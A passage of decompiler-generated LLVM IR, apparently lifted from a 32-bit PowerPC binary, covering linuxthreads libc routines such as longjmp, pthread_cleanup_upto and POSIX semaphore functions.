  %v0_10006c28 = load i32, i32* @r30, align 4
  %v1_10006c28 = load i32, i32* @r31, align 4
  %v2_10006c28 = add i32 %v1_10006c28, 8
  %v3_10006c28 = inttoptr i32 %v2_10006c28 to i32*
  store i32 %v0_10006c28, i32* %v3_10006c28, align 4
  br label %dec_label_pc_10006c5c

dec_label_pc_10006c30:                            ; preds = %dec_label_pc_10006b98
  %v1_10006c34 = add i32 %arg1, 16
  store i32 %v1_10006c34, i32* %r3.global-to-local, align 4
  store i32 268463168, i32* @lr, align 4
  %v4_10006c3c = inttoptr i32 %v1_10006c34 to i32*
  %v5_10006c3c = call i32 @__pthread_alt_timedlock(i32* %v4_10006c3c, i32 0, i32 %arg2, i32 999999999)
  %v3_10006c40 = icmp eq i32 %v5_10006c3c, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_10006c40, label %dec_label_pc_10006c58, label %dec_label_pc_10006c5c

dec_label_pc_10006c50:                            ; preds = %dec_label_pc_10006b84, %dec_label_pc_10006b98, %entry
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c5c

dec_label_pc_10006c58:                            ; preds = %dec_label_pc_10006c30, %dec_label_pc_10006c0c
  store i32 110, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006c5c

dec_label_pc_10006c5c:                            ; preds = %dec_label_pc_10006c30, %dec_label_pc_10006bf8, %dec_label_pc_10006c50, %dec_label_pc_10006c28, %dec_label_pc_10006bc8, %dec_label_pc_10006ba4, %dec_label_pc_10006c58
  %v0_10006c6c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10006c6c

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 11, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 0 }
  uselistorder i32 999999999, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 7, 0, 1, 6, 5, 3, 4, 2, 8 }
  uselistorder label %dec_label_pc_10006c5c, { 6, 2, 0, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_10006c50, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006c28, { 1, 0 }
}

define i32 @pthread_cleanup_upto() local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10006c74 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10006c74, i32* %stack_var_-32, align 4
  %v5_10006c74 = ptrtoint i32* %stack_var_-32 to i32
  %v0_10006c7c = load i32, i32* @r2, align 4
  store i32 %v0_10006c7c, i32* %r30.global-to-local, align 4
  %v0_10006c84 = load i32, i32* @r3, align 4
  store i32 %v0_10006c84, i32* @r28, align 4
  store i32 %v5_10006c74, i32* @r29, align 4
  %v1_10006c8c = add i32 %v0_10006c7c, 60
  %storemerge.in11 = inttoptr i32 %v1_10006c8c to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r31.global-to-local, align 4
  %v3_10006cb415 = icmp eq i32 %storemerge12, 0
  %v3_10006cb817 = icmp ugt i32 %storemerge12, %v5_10006c74
  br i1 %v3_10006cb415, label %dec_label_pc_10006ccc, label %dec_label_pc_10006cc0

dec_label_pc_10006c94:                            ; preds = %dec_label_pc_10006cc0
  br i1 %v3_10006cb821, label %dec_label_pc_10006ca0, label %dec_label_pc_10006c98

dec_label_pc_10006c98:                            ; preds = %dec_label_pc_10006c94
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10006ccc

dec_label_pc_10006ca0:                            ; preds = %dec_label_pc_10006c94
  %v1_10006ca0 = inttoptr i32 %storemerge20 to i32*
  %v2_10006ca0 = load i32, i32* %v1_10006ca0, align 4
  %v1_10006ca4 = add i32 %storemerge20, 4
  %v2_10006ca4 = inttoptr i32 %v1_10006ca4 to i32*
  %v3_10006ca4 = load i32, i32* %v2_10006ca4, align 4
  call void @__pseudo_call(i32 %v2_10006ca0)
  %v0_10006cb0 = load i32, i32* %r31.global-to-local, align 4
  %v1_10006cb0 = add i32 %v0_10006cb0, 12
  %v1_10006cb8.pre = load i32, i32* @r29, align 4
  %storemerge.in = inttoptr i32 %v1_10006cb0 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_10006cb4 = icmp eq i32 %storemerge, 0
  br i1 %v3_10006cb4, label %dec_label_pc_10006ccc, label %dec_label_pc_10006ca0.dec_label_pc_10006cc0_crit_edge

dec_label_pc_10006ca0.dec_label_pc_10006cc0_crit_edge: ; preds = %dec_label_pc_10006ca0
  %v3_10006cb8 = icmp ugt i32 %storemerge, %v1_10006cb8.pre
  %v0_10006cc0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10006cc0

dec_label_pc_10006cc0:                            ; preds = %entry, %dec_label_pc_10006ca0.dec_label_pc_10006cc0_crit_edge
  %v0_10006cc0 = phi i32 [ %v0_10006cc0.pre, %dec_label_pc_10006ca0.dec_label_pc_10006cc0_crit_edge ], [ %v0_10006c84, %entry ]
  %v3_10006cb821 = phi i1 [ %v3_10006cb8, %dec_label_pc_10006ca0.dec_label_pc_10006cc0_crit_edge ], [ %v3_10006cb817, %entry ]
  %storemerge20 = phi i32 [ %storemerge, %dec_label_pc_10006ca0.dec_label_pc_10006cc0_crit_edge ], [ %storemerge12, %entry ]
  %.019 = phi i32 [ %v3_10006ca4, %dec_label_pc_10006ca0.dec_label_pc_10006cc0_crit_edge ], [ undef, %entry ]
  %v1_10006cc0 = inttoptr i32 %v0_10006cc0 to i32*
  %v2_10006cc0 = load i32, i32* %v1_10006cc0, align 4
  %v2_10006cc4 = icmp ult i32 %storemerge20, %v2_10006cc0
  br i1 %v2_10006cc4, label %dec_label_pc_10006c94, label %dec_label_pc_10006ccc

dec_label_pc_10006ccc:                            ; preds = %entry, %dec_label_pc_10006ca0, %dec_label_pc_10006cc0, %dec_label_pc_10006c98
  %.010 = phi i32 [ %.019, %dec_label_pc_10006c98 ], [ undef, %entry ], [ %v3_10006ca4, %dec_label_pc_10006ca0 ], [ %.019, %dec_label_pc_10006cc0 ]
  %v0_10006cd0 = phi i32 [ 0, %dec_label_pc_10006c98 ], [ 0, %entry ], [ 0, %dec_label_pc_10006ca0 ], [ %storemerge20, %dec_label_pc_10006cc0 ]
  %v0_10006ccc = load i32, i32* %r30.global-to-local, align 4
  %v1_10006ccc = add i32 %v0_10006ccc, 84
  %v2_10006ccc = inttoptr i32 %v1_10006ccc to i32*
  %v3_10006ccc = load i32, i32* %v2_10006ccc, align 4
  store i32 %v3_10006ccc, i32* %r9.global-to-local, align 4
  %v2_10006cd0 = add i32 %v0_10006ccc, 60
  %v3_10006cd0 = inttoptr i32 %v2_10006cd0 to i32*
  store i32 %v0_10006cd0, i32* %v3_10006cd0, align 4
  %v0_10006cd4 = load i32, i32* %r9.global-to-local, align 4
  %v3_10006cd4 = icmp eq i32 %v0_10006cd4, 0
  br i1 %v3_10006cd4, label %dec_label_pc_10006cf0, label %dec_label_pc_10006cdc

dec_label_pc_10006cdc:                            ; preds = %dec_label_pc_10006ccc
  %v0_10006cdc = load i32, i32* @r28, align 4
  %v1_10006cdc = inttoptr i32 %v0_10006cdc to i32*
  %v2_10006cdc = load i32, i32* %v1_10006cdc, align 4
  %v2_10006ce0 = icmp ult i32 %v0_10006cd4, %v2_10006cdc
  br i1 %v2_10006ce0, label %dec_label_pc_10006ce8, label %dec_label_pc_10006cf0

dec_label_pc_10006ce8:                            ; preds = %dec_label_pc_10006cdc
  %v1_10006cec = load i32, i32* %r30.global-to-local, align 4
  %v2_10006cec = add i32 %v1_10006cec, 84
  %v3_10006cec = inttoptr i32 %v2_10006cec to i32*
  store i32 0, i32* %v3_10006cec, align 4
  br label %dec_label_pc_10006cf0

dec_label_pc_10006cf0:                            ; preds = %dec_label_pc_10006cdc, %dec_label_pc_10006ccc, %dec_label_pc_10006ce8
  ret i32 %.010

; uselistorder directives
  uselistorder i32 %storemerge20, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10006cf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006ccc, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_10006cc0, { 1, 0 }
}

define i32 @longjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 268463392, i32* @lr, align 4
  %v0_10006d1c = call i32 @pthread_cleanup_upto()
  %v0_10006d20 = load i32, i32* @r29, align 4
  %v0_10006d24 = load i32, i32* @r28, align 4
  store i32 268463404, i32* @lr, align 4
  %v2_10006d28 = call i32 @_longjmp(i32 %v0_10006d20, i32 %v0_10006d24)
  ret i32 %v2_10006d28
}

define i32 @siglongjmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 268463432, i32* @lr, align 4
  %v0_10006d44 = call i32 @pthread_cleanup_upto()
  %v0_10006d48 = load i32, i32* @r29, align 4
  %v0_10006d4c = load i32, i32* @r28, align 4
  store i32 268463444, i32* @lr, align 4
  %v2_10006d50 = call i32 @_longjmp(i32 %v0_10006d48, i32 %v0_10006d4c)
  ret i32 %v2_10006d50

; uselistorder directives
  uselistorder i32 (i32, i32)* @_longjmp, { 1, 0 }
  uselistorder i32 ()* @pthread_cleanup_upto, { 1, 0 }
}

define i32 @enqueue.5(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable

; uselistorder directives
  uselistorder void ()* @llvm.trap, { 1, 2, 0, 3 }
}

define i32 @remove_from_queue.6(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10006dac.pre = load i32, i32* @r3, align 4
  %v1_10006dac21 = inttoptr i32 %v0_10006dac.pre to i32*
  %v2_10006dac22 = load i32, i32* %v1_10006dac21, align 4
  store i32 %v2_10006dac22, i32* %r9.global-to-local, align 4
  %v3_10006db025 = icmp eq i32 %v2_10006dac22, 0
  br i1 %v3_10006db025, label %dec_label_pc_10006dbc, label %dec_label_pc_10006d8c

dec_label_pc_10006d8c:                            ; preds = %entry, %dec_label_pc_10006da8
  %v2_10006dac.pn = phi i32 [ %v2_10006dac, %dec_label_pc_10006da8 ], [ %v2_10006dac22, %entry ]
  %v2_10006dac30 = phi i32 [ %v2_10006dac, %dec_label_pc_10006da8 ], [ %v2_10006dac22, %entry ]
  %v1_10006dac29 = phi i32* [ %v1_10006dac, %dec_label_pc_10006da8 ], [ %v1_10006dac21, %entry ]
  %v4_10006db435 = icmp eq i32 %v2_10006dac.pn, %arg1
  %v1_10006d90 = add i32 %v2_10006dac30, 8
  br i1 %v4_10006db435, label %dec_label_pc_10006d90, label %dec_label_pc_10006da8

dec_label_pc_10006d90:                            ; preds = %dec_label_pc_10006d8c
  %v2_10006d90 = inttoptr i32 %v1_10006d90 to i32*
  %v3_10006d90 = load i32, i32* %v2_10006d90, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v3_10006d90, i32* %v1_10006dac29, align 4
  %v1_10006da0 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006da0 = add i32 %v1_10006da0, 8
  %v3_10006da0 = inttoptr i32 %v2_10006da0 to i32*
  store i32 0, i32* %v3_10006da0, align 4
  %v0_10006dc0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006dc0

dec_label_pc_10006da8:                            ; preds = %dec_label_pc_10006d8c
  %v1_10006dac = inttoptr i32 %v1_10006d90 to i32*
  %v2_10006dac = load i32, i32* %v1_10006dac, align 4
  store i32 %v2_10006dac, i32* %r9.global-to-local, align 4
  %v3_10006db0 = icmp eq i32 %v2_10006dac, 0
  br i1 %v3_10006db0, label %dec_label_pc_10006dbc, label %dec_label_pc_10006d8c

dec_label_pc_10006dbc:                            ; preds = %dec_label_pc_10006da8, %entry
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10006dc0

dec_label_pc_10006dc0:                            ; preds = %dec_label_pc_10006d90, %dec_label_pc_10006dbc
  %v0_10006dc0 = phi i32 [ %v0_10006dc0.pre, %dec_label_pc_10006d90 ], [ 0, %dec_label_pc_10006dbc ]
  ret i32 %v0_10006dc0

; uselistorder directives
  uselistorder i32 %v2_10006dac, { 2, 3, 0, 1 }
  uselistorder i32* %v1_10006dac, { 1, 0 }
  uselistorder i32 %v1_10006d90, { 1, 0 }
  uselistorder i32 %v2_10006dac22, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10006dc0, { 1, 0 }
  uselistorder label %dec_label_pc_10006d8c, { 1, 0 }
}

define i32 @__new_sem_getvalue(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10006dc8 = add i32 %arg1, 8
  %v2_10006dc8 = inttoptr i32 %v1_10006dc8 to i32*
  %v3_10006dc8 = load i32, i32* %v2_10006dc8, align 4
  store i32 %v3_10006dc8, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_set_own_extricate_if.7(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10006dd8 = call i32 @__asm_mfcr()
  store i32 %v0_10006dd8, i32* %r3.global-to-local, align 4
  %v3_10006ddc = icmp eq i32 %arg2, 0
  store i1 %v3_10006ddc, i1* %cr4_eq.global-to-local, align 1
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_10006dd8, i32* @r31, align 4
  store i32 %v0_10006dd8, i32* @r4, align 4
  br i1 %v3_10006ddc, label %dec_label_pc_10006e1c, label %dec_label_pc_10006e04

dec_label_pc_10006e04:                            ; preds = %entry
  %v1_10006e04 = add i32 %v0_10006dd8, 64
  %v2_10006e04 = inttoptr i32 %v1_10006e04 to i8*
  %v3_10006e04 = load i8, i8* %v2_10006e04, align 1
  %v3_10006e08 = icmp eq i8 %v3_10006e04, 0
  br i1 %v3_10006e08, label %dec_label_pc_10006e1c.thread, label %dec_label_pc_10006e2c

dec_label_pc_10006e1c.thread:                     ; preds = %dec_label_pc_10006e04
  %v2_10006e1c4 = add i32 %v0_10006dd8, 444
  %v3_10006e1c5 = inttoptr i32 %v2_10006e1c4 to i32*
  store i32 %arg2, i32* %v3_10006e1c5, align 4
  br label %dec_label_pc_10006e2c

dec_label_pc_10006e1c:                            ; preds = %entry
  %v1_10006e14 = add i32 %v0_10006dd8, 28
  %v2_10006e14 = inttoptr i32 %v1_10006e14 to i32*
  %v3_10006e14 = load i32, i32* %v2_10006e14, align 4
  store i32 %v3_10006e14, i32* @r3, align 4
  store i32 268463644, i32* @lr, align 4
  %v0_10006e18 = call i32 @__pthread_lock()
  store i32 %v0_10006e18, i32* %r3.global-to-local, align 4
  %v0_10006e1c.pre = load i32, i32* @r30, align 4
  %v1_10006e1c.pre = load i32, i32* @r31, align 4
  %v0_10006e20.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v2_10006e1c = add i32 %v1_10006e1c.pre, 444
  %v3_10006e1c = inttoptr i32 %v2_10006e1c to i32*
  store i32 %v0_10006e1c.pre, i32* %v3_10006e1c, align 4
  br i1 %v0_10006e20.pre, label %dec_label_pc_10006e24, label %dec_label_pc_10006e2c

dec_label_pc_10006e24:                            ; preds = %dec_label_pc_10006e1c
  %v0_10006e24 = load i32, i32* @r31, align 4
  %v1_10006e24 = add i32 %v0_10006e24, 28
  %v2_10006e24 = inttoptr i32 %v1_10006e24 to i32*
  %v3_10006e24 = load i32, i32* %v2_10006e24, align 4
  store i32 %v3_10006e24, i32* @r3, align 4
  store i32 268463660, i32* @lr, align 4
  %v0_10006e28 = call i32 @__pthread_unlock()
  store i32 %v0_10006e28, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006e2c

dec_label_pc_10006e2c:                            ; preds = %dec_label_pc_10006e1c.thread, %dec_label_pc_10006e1c, %dec_label_pc_10006e04, %dec_label_pc_10006e24
  %v1_10006e3c = call %0 @__asm_mtcrf(i32 8, i32 %v0_10006dd8)
  %v0_10006e44 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10006e44

; uselistorder directives
  uselistorder i32 %v0_10006dd8, { 5, 4, 0, 3, 2, 1, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 4, 1, 0 }
  uselistorder i32 444, { 3, 0, 6, 1, 5, 2, 4 }
  uselistorder label %dec_label_pc_10006e2c, { 3, 1, 0, 2 }
}

define i32 @sem_unlink() local_unnamed_addr {
entry:
  %v0_10006e54 = call i32 @__errno_location()
  %v2_10006e5c = inttoptr i32 %v0_10006e54 to i32*
  store i32 38, i32* %v2_10006e5c, align 4
  ret i32 -1
}

define i32 @sem_close() local_unnamed_addr {
entry:
  %v0_10006e80 = call i32 @__errno_location()
  %v2_10006e88 = inttoptr i32 %v0_10006e80 to i32*
  store i32 38, i32* %v2_10006e88, align 4
  ret i32 -1
}

define i32 @sem_open() local_unnamed_addr {
entry:
  %v0_10006eac = call i32 @__errno_location()
  %v2_10006eb4 = inttoptr i32 %v0_10006eac to i32*
  store i32 38, i32* %v2_10006eb4, align 4
  ret i32 0
}

define i32 @__new_sem_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10006ed8 = add i32 %arg1, 12
  %v2_10006ed8 = inttoptr i32 %v1_10006ed8 to i32*
  %v3_10006ed8 = load i32, i32* %v2_10006ed8, align 4
  %v3_10006ee0 = icmp eq i32 %v3_10006ed8, 0
  br i1 %v3_10006ee0, label %dec_label_pc_10006ef8, label %dec_label_pc_10006ee8

dec_label_pc_10006ee8:                            ; preds = %entry
  %v0_10006ee8 = call i32 @__errno_location()
  %v2_10006ef0 = inttoptr i32 %v0_10006ee8 to i32*
  store i32 16, i32* %v2_10006ef0, align 4
  br label %dec_label_pc_10006ef8

dec_label_pc_10006ef8:                            ; preds = %entry, %dec_label_pc_10006ee8
  %v0_10006f04 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_10006ee8 ]
  ret i32 %v0_10006f04

; uselistorder directives
  uselistorder label %dec_label_pc_10006ef8, { 1, 0 }
}

define i32 @__new_sem_trywait(i32 %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268463908, i32* @lr, align 4
  %v0_10006f20 = call i32 @__pthread_lock()
  %v0_10006f24 = load i32, i32* @r31, align 4
  %v1_10006f24 = add i32 %v0_10006f24, 8
  %v2_10006f24 = inttoptr i32 %v1_10006f24 to i32*
  %v3_10006f24 = load i32, i32* %v2_10006f24, align 4
  store i32 -1, i32* %r30.global-to-local, align 4
  %v3_10006f2c = icmp eq i32 %v3_10006f24, 0
  br i1 %v3_10006f2c, label %dec_label_pc_10006f38, label %dec_label_pc_10006f48

dec_label_pc_10006f38:                            ; preds = %entry
  %v0_10006f38 = call i32 @__errno_location()
  %v2_10006f40 = inttoptr i32 %v0_10006f38 to i32*
  store i32 11, i32* %v2_10006f40, align 4
  br label %dec_label_pc_10006f50

dec_label_pc_10006f48:                            ; preds = %entry
  %v1_10006f30 = add i32 %v3_10006f24, -1
  store i32 %v1_10006f30, i32* %v2_10006f24, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10006f50

dec_label_pc_10006f50:                            ; preds = %dec_label_pc_10006f38, %dec_label_pc_10006f48
  %v0_10006f50 = load i32, i32* @r31, align 4
  store i32 %v0_10006f50, i32* @r3, align 4
  store i32 268463960, i32* @lr, align 4
  %v0_10006f54 = call i32 @__pthread_unlock()
  %v0_10006f58 = load i32, i32* %r30.global-to-local, align 4
  ret i32 %v0_10006f58

; uselistorder directives
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006f50, { 1, 0 }
}

define i32 @__new_sem_init(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp5 = icmp sgt i32 %arg3, -1
  br i1 %tmp5, label %dec_label_pc_10006f98, label %dec_label_pc_10006f88

dec_label_pc_10006f88:                            ; preds = %entry
  %v0_10006f88 = call i32 @__errno_location()
  br label %dec_label_pc_10006fa8

dec_label_pc_10006f98:                            ; preds = %entry
  %v3_10006f7c = icmp eq i32 %arg2, 0
  br i1 %v3_10006f7c, label %dec_label_pc_10006fb0, label %dec_label_pc_10006f9c

dec_label_pc_10006f9c:                            ; preds = %dec_label_pc_10006f98
  %v0_10006f9c = call i32 @__errno_location()
  br label %dec_label_pc_10006fa8

dec_label_pc_10006fa8:                            ; preds = %dec_label_pc_10006f88, %dec_label_pc_10006f9c
  %storemerge1 = phi i32 [ %v0_10006f88, %dec_label_pc_10006f88 ], [ %v0_10006f9c, %dec_label_pc_10006f9c ]
  %storemerge = phi i32 [ 22, %dec_label_pc_10006f88 ], [ 38, %dec_label_pc_10006f9c ]
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10006fa8 = inttoptr i32 %storemerge1 to i32*
  store i32 %storemerge, i32* %v2_10006fa8, align 4
  br label %dec_label_pc_10006fc4

dec_label_pc_10006fb0:                            ; preds = %dec_label_pc_10006f98
  %v2_10006fb0 = add i32 %tmp, 12
  %v3_10006fb0 = inttoptr i32 %v2_10006fb0 to i32*
  store i32 0, i32* %v3_10006fb0, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10006fb8 = add i32 %tmp, 8
  %v3_10006fb8 = inttoptr i32 %v2_10006fb8 to i32*
  store i32 %arg3, i32* %v3_10006fb8, align 4
  store i32 0, i32* %arg1, align 4
  %v2_10006fc0 = add i32 %tmp, 4
  %v3_10006fc0 = inttoptr i32 %v2_10006fc0 to i32*
  store i32 0, i32* %v3_10006fc0, align 4
  br label %dec_label_pc_10006fc4

dec_label_pc_10006fc4:                            ; preds = %dec_label_pc_10006fa8, %dec_label_pc_10006fb0
  %v0_10006fc8 = load i32, i32* %r9.global-to-local, align 4
  ret i32 %v0_10006fc8

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_10006fc4, { 1, 0 }
  uselistorder label %dec_label_pc_10006fa8, { 1, 0 }
}

define i32 @suspend.8(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268464104, i32* @lr, align 4
  %v0_10006fe4 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10006fe4
}

define i32 @__new_sem_wait(i32 %arg1) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_10007004 = load i32, i32* @r2, align 4
  store i32 %v0_10007004, i32* @r4, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  store i32 268464168, i32* @lr, align 4
  %v0_10007024 = call i32 @__pthread_lock()
  %v0_10007028 = load i32, i32* @r31, align 4
  %v1_10007028 = add i32 %v0_10007028, 8
  %v2_10007028 = inttoptr i32 %v1_10007028 to i32*
  %v3_10007028 = load i32, i32* %v2_10007028, align 4
  %tmp12 = icmp slt i32 %v3_10007028, 1
  br i1 %tmp12, label %dec_label_pc_10007048, label %dec_label_pc_10007034

dec_label_pc_10007034:                            ; preds = %entry
  %v1_10007034 = add i32 %v3_10007028, -1
  store i32 %v0_10007028, i32* @r3, align 4
  store i32 %v1_10007034, i32* %v2_10007028, align 4
  store i32 ptrtoint (i32* @global_var_10007044.238 to i32), i32* @lr, align 4
  %v0_10007040 = call i32 @__pthread_unlock()
  br label %dec_label_pc_10007134

dec_label_pc_10007048:                            ; preds = %entry
  %v2_10007050 = ptrtoint i32* %stack_var_-20 to i32
  %v3_10007054 = add i32 %v0_10007004, 442
  %v4_10007054 = inttoptr i32 %v3_10007054 to i8*
  store i8 0, i8* %v4_10007054, align 1
  store i32 268464224, i32* @lr, align 4
  %v2_1000705c = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10007004, i32 %v2_10007050)
  %v1_10007064 = add i32 %v0_10007004, 66
  %v2_10007064 = inttoptr i32 %v1_10007064 to i8*
  %v3_10007064 = load i8, i8* %v2_10007064, align 1
  %v3_10007068 = icmp eq i8 %v3_10007064, 0
  br i1 %v3_10007068, label %dec_label_pc_10007084, label %dec_label_pc_10007070

dec_label_pc_10007070:                            ; preds = %dec_label_pc_10007048
  store i32 1, i32* %r30.global-to-local, align 4
  %v1_10007078 = add i32 %v0_10007004, 64
  %v2_10007078 = inttoptr i32 %v1_10007078 to i8*
  %v3_10007078 = load i8, i8* %v2_10007078, align 1
  %v3_1000707c = icmp eq i8 %v3_10007078, 0
  br i1 %v3_1000707c, label %dec_label_pc_10007094, label %dec_label_pc_10007084

dec_label_pc_10007084:                            ; preds = %dec_label_pc_10007070, %dec_label_pc_10007048
  %v0_10007088 = load i32, i32* @r31, align 4
  %v1_10007088 = add i32 %v0_10007088, 12
  store i32 0, i32* %r30.global-to-local, align 4
  %v2_10007090 = call i32 @enqueue.5(i32 %v1_10007088, i32 %v0_10007004)
  br label %dec_label_pc_10007094

dec_label_pc_10007094:                            ; preds = %dec_label_pc_10007070, %dec_label_pc_10007084
  %v0_10007094 = load i32, i32* @r31, align 4
  store i32 %v0_10007094, i32* @r3, align 4
  store i32 268464284, i32* @lr, align 4
  %v0_10007098 = call i32 @__pthread_unlock()
  %v0_1000709c = load i32, i32* %r30.global-to-local, align 4
  %v3_1000709c = icmp eq i32 %v0_1000709c, 0
  store i32 %v0_10007004, i32* @r3, align 4
  br i1 %v3_1000709c, label %dec_label_pc_100070bc.preheader, label %dec_label_pc_100070a4

dec_label_pc_100070bc.preheader:                  ; preds = %dec_label_pc_10007094
  store i32 268464324, i32* @lr, align 4
  %v1_100070c01 = call i32 @suspend.8(i32 %v0_10007004)
  %v3_100070c82 = load i8, i8* %v4_10007054, align 1
  %v3_100070cc5 = icmp eq i8 %v3_100070c82, 0
  %v1_100070d8 = add i32 %v0_10007004, 440
  %v2_100070d8 = inttoptr i32 %v1_100070d8 to i8*
  br i1 %v3_100070cc5, label %dec_label_pc_100070d4.lr.ph, label %dec_label_pc_100070f4

dec_label_pc_100070d4.lr.ph:                      ; preds = %dec_label_pc_100070bc.preheader
  %v1_100070e8 = add i32 %v0_10007004, 64
  %v2_100070e8 = inttoptr i32 %v1_100070e8 to i8*
  br label %dec_label_pc_100070d4

dec_label_pc_100070a4:                            ; preds = %dec_label_pc_10007094
  store i32 268464304, i32* @lr, align 4
  %v2_100070ac = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10007004, i32 0)
  br label %dec_label_pc_10007130

dec_label_pc_100070d4:                            ; preds = %dec_label_pc_100070d4.lr.ph, %dec_label_pc_100070bc.backedge
  %v3_100070d8 = load i8, i8* %v2_100070d8, align 1
  %v3_100070dc = icmp eq i8 %v3_100070d8, 0
  br i1 %v3_100070dc, label %dec_label_pc_100070bc.backedge, label %dec_label_pc_100070e4

dec_label_pc_100070bc.backedge:                   ; preds = %dec_label_pc_100070d4, %dec_label_pc_100070e4
  store i32 %v0_10007004, i32* @r3, align 4
  store i32 268464324, i32* @lr, align 4
  %v1_100070c0 = call i32 @suspend.8(i32 %v0_10007004)
  %v3_100070c8 = load i8, i8* %v4_10007054, align 1
  %v3_100070cc = icmp eq i8 %v3_100070c8, 0
  br i1 %v3_100070cc, label %dec_label_pc_100070d4, label %dec_label_pc_100070f4

dec_label_pc_100070e4:                            ; preds = %dec_label_pc_100070d4
  %v3_100070e8 = load i8, i8* %v2_100070e8, align 1
  %v3_100070ec = icmp eq i8 %v3_100070e8, 0
  br i1 %v3_100070ec, label %dec_label_pc_100070f4, label %dec_label_pc_100070bc.backedge

dec_label_pc_100070f4:                            ; preds = %dec_label_pc_100070bc.backedge, %dec_label_pc_100070e4, %dec_label_pc_100070bc.preheader
  store i32 268464384, i32* @lr, align 4
  %v2_100070fc = call i32 @__pthread_set_own_extricate_if.7(i32 %v0_10007004, i32 0)
  %v3_10007104 = load i8, i8* %v2_100070d8, align 1
  %v3_10007108 = icmp eq i8 %v3_10007104, 0
  br i1 %v3_10007108, label %dec_label_pc_10007134, label %dec_label_pc_10007110

dec_label_pc_10007110:                            ; preds = %dec_label_pc_100070f4
  %v1_10007114 = add i32 %v0_10007004, 64
  %v2_10007114 = inttoptr i32 %v1_10007114 to i8*
  %v3_10007114 = load i8, i8* %v2_10007114, align 1
  %v3_10007118 = icmp eq i8 %v3_10007114, 0
  br i1 %v3_10007118, label %dec_label_pc_10007120, label %dec_label_pc_10007134

dec_label_pc_10007120:                            ; preds = %dec_label_pc_10007110
  store i8 0, i8* %v2_100070d8, align 1
  br label %dec_label_pc_10007130

dec_label_pc_10007130:                            ; preds = %dec_label_pc_100070a4, %dec_label_pc_10007120
  %v0_10007130 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10007134

dec_label_pc_10007134:                            ; preds = %dec_label_pc_10007110, %dec_label_pc_100070f4, %dec_label_pc_10007034, %dec_label_pc_10007130
  ret i32 0

; uselistorder directives
  uselistorder i8* %v4_10007054, { 1, 0, 2 }
